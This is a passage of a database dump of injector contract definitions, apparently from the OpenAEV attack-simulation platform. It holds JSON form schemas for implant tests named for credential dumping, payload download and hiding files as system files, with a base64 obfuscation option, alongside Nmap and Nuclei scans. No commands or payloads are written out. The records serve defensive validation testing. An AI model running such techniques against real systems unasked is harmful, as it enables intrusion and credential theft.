link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"af6631b3-1ca5-4e92-bab1-d1f274ba7691","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	7f64d8b8-2903-4911-bd29-f6e3791907c0	f	\N
14abc115-80f0-4c7b-833d-64a3392806ce	2026-01-09 14:19:27.271334+00	2026-01-09 14:19:27.271349+00	"en"=>"Cleanup artifacts", "fr"=>"Cleanup artifacts"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Cleanup artifacts","en":"Cleanup artifacts"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"14abc115-80f0-4c7b-833d-64a3392806ce","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	dd5dfd98-5d6e-4ce3-8a9c-097f8e514261	f	\N
a4eb02bd-3c9f-4a97-b9a1-54a9b7a7f21e	2026-01-09 14:19:36.681148+00	2026-01-16 10:18:33.257268+00	"en"=>"Nuclei - Misconfigurations", "fr"=>"Nuclei - Mauvaises configurations"	f	{"contract_id": "a4eb02bd-3c9f-4a97-b9a1-54a9b7a7f21e", "label": {"en": "Nuclei - Misconfigurations", "fr": "Nuclei - Mauvaises configurations"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
7ff2f205-598d-4350-9a76-6e19ee6d1a89	2026-01-09 14:47:40.50945+00	2026-01-09 14:47:40.509458+00	"en"=>"Test - Download Payload", "fr"=>"Test - Download Payload"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Download Payload","en":"Test - Download Payload"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"7ff2f205-598d-4350-9a76-6e19ee6d1a89","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	2083c49f-5b0a-4494-add7-ed8b61dc9ee7	f	\N
2790bd39-37d4-4e39-be7e-53f3ca783f86	2026-01-09 14:19:18.544192+00	2026-01-09 14:19:34.274895+00	"en"=>"Send multi-recipients mail", "fr"=>"Envoyer un mail multi-destinataires"	f	{"config":{"type":"openaev_email","expose":true,"label":{"fr":"Email","en":"Email"},"color_dark":"#cddc39","color_light":"#cddc39"},"label":{"fr":"Envoyer un mail multi-destinataires","en":"Send multi-recipients mail"},"manual":false,"fields":[{"key":"teams","label":"Teams","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"team"},{"key":"subject","label":"Subject","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","type":"text"},{"key":"body","label":"Body","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","richText":true,"type":"textarea"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[],"type":"expectation"}],"variables":[{"key":"document_uri","label":"Http user link to upload the document (only for document expectation)","type":"String","cardinality":"1","children":[]},{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"2790bd39-37d4-4e39-be7e-53f3ca783f86","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":false,"platforms":["Service"]}	41b4dd55-5bd1-4614-98cd-9e3770753306	t	f	{Service}	f	\N	t	\N
a04db27d-842a-445b-a070-823c67a172d4	2026-01-09 14:51:27.630886+00	2026-01-09 14:51:27.630897+00	"en"=>"Test - Hide as System File", "fr"=>"Test - Hide as System File"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Hide as System File","en":"Test - Hide as System File"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"a04db27d-842a-445b-a070-823c67a172d4","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	593b32d5-baaf-4e34-a8f8-6af526028571	f	\N
0b7f3674-ac5d-4b95-b749-6665e74a211f	2026-01-09 14:19:36.994297+00	2026-01-16 10:18:19.748924+00	"en"=>"Nmap - SYN Scan", "fr"=>"Nmap - SYN Scan"	f	{"contract_id": "0b7f3674-ac5d-4b95-b749-6665e74a211f", "label": {"en": "Nmap - SYN Scan", "fr": "Nmap - SYN Scan"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "DETECTION", "expectation_name": "Detection", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}], "outputs": [{"type": "portscan", "field": "scan_results", "labels": ["scan"], "isFindingCompatible": true, "isMultiple": true}, {"type": "port", "field": "ports", "labels": ["scan"], "isFindingCompatible": false, "isMultiple": true}], "config": {"type": "openaev_nmap", "expose": true, "label": {"en": "Nmap Scan", "fr": "Nmap Scan"}, "color_dark": "#00bcd4", "color_light": "#00bcd4"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	76f8f4d6-9f6f-4e61-befc-48f735876a4a	t	f	{}	f	\N	f	\N
f899dba0-035b-4310-99de-1f518b73085a	2026-01-09 14:52:13.296323+00	2026-01-09 14:52:13.296332+00	"en"=>"Test - Credential Dump", "fr"=>"Test - Credential Dump"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Credential Dump","en":"Test - Credential Dump"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"f899dba0-035b-4310-99de-1f518b73085a","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	75735fae-b6d2-4424-83f3-49cd8f49754c	f	\N
2e7fc079-4531-4444-4444-44b2f41a8c5f	2026-01-09 14:19:37.138428+00	2026-01-16 10:18:33.257736+00	"en"=>"Nuclei - Wordpress Scan", "fr"=>"Nuclei - Scan Wordpress"	f	{"contract_id": "2e7fc079-4531-4444-4444-44b2f41a8c5f", "label": {"en": "Nuclei - Wordpress Scan", "fr": "Nuclei - Scan Wordpress"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": 